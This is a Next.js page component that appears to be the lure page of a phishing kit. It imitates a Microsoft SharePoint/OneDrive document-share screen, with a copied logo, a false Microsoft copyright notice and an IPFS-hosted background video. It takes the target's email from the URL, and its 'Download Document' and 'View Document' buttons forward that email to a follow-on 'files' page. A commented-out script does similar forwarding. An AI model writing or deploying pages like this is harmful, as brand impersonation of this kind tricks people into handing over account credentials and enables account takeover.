import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/router';

const videoStyle = {
  objectFit: 'cover',
  width: '100vw',
  height: '100vh',
  position: 'fixed',
  top: '0',
  left: '0',
  zIndex: '-1',
};

export default function FileShare() {
  const router = useRouter();

  const { email } = router.query;

  const navigateToFiles = () => {
    location.href = `files?email=${email}`;
  };

  return (
    <>
      <link
        rel="stylesheet"
        href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
      />
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
      <nav className="navbar bg-white">
        <div className="container">
          <a className="navbar-brand" href="#">
            <img src=" data:image/jpeg;base64,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" />
          </a>
          <button className="navbar-toggler " type="button ">
            <span className="navbar-toggler-icon text-dark"></span>
          </button>
        </div>
      </nav>
      <video
        playsInline
        autoPlay
        muted
        loop
        poster="polina.jpg"
        id="bgvid"
        style={videoStyle}
      >
        <source
          src="https://bafybeibhrmtgeyweegvamsdkqpsmv2v2vhniok6fpjy2cm2ganqoaj32oq.ipfs.w3s.link/vd.mp4"
          type="video/webm"
        />
        <source src="vd" type="video/mp4" />
      </video>

      <div className="container">
        <div className="d-flex justify-content-center">
          <div className="col-sm-8 my-4 text-center">
            <div className="my-4">
              {' '}
              <img src=" data:image/png;base64,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" />
            </div>
            <span
              className="text-white"
              style={{ fontSize: '42px', fontWeight: '100' }}
            >
              {' '}
              Welcome to Microsoft{' '}
            </span>
            <span
              className="text-white"
              style={{ fontSize: '42px', fontWeight: '900' }}
            >
              SharePoint
            </span>
            <div style={{ color: 'white', fontSize: '20px' }}>
              Save your files and photos to OneDrive and get them from any
              device, anywhere
            </div>
            <div
              className="d-flex justify-content-center my-5"
              style={{ gap: '3px' }}
            >
              <a>
                <button
                  onClick={navigateToFiles}
                  className="btn btn-primary"
                  disabled={!email}
                >
                  Download Document
                </button>
              </a>
              <a>
                <button
                  onClick={navigateToFiles}
                  className="btn btn-primary"
                  disabled={!email}
                >
                  View Document
                </button>
              </a>
            </div>

            <div className="my-5 text-white" style={{ fontSize: '12px' }}>
              Office365, Outlook, SharePoint, OneDrive, Skype, OneNote,
              PowerPoint, Word, Excel are all trademarks of Microsoft. All
              rights reserved &copy; Microsoft 2023.
            </div>
          </div>

          {/* <script>
          $(document).ready(function () {
             
              var baseUrl = (window.location).href;
              var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
        $('button').click(function(){
window.location.href="index-1.html?x1="+url;
        });
  
         
          });
      </script> */}
        </div>
      </div>
    </>
  );
}
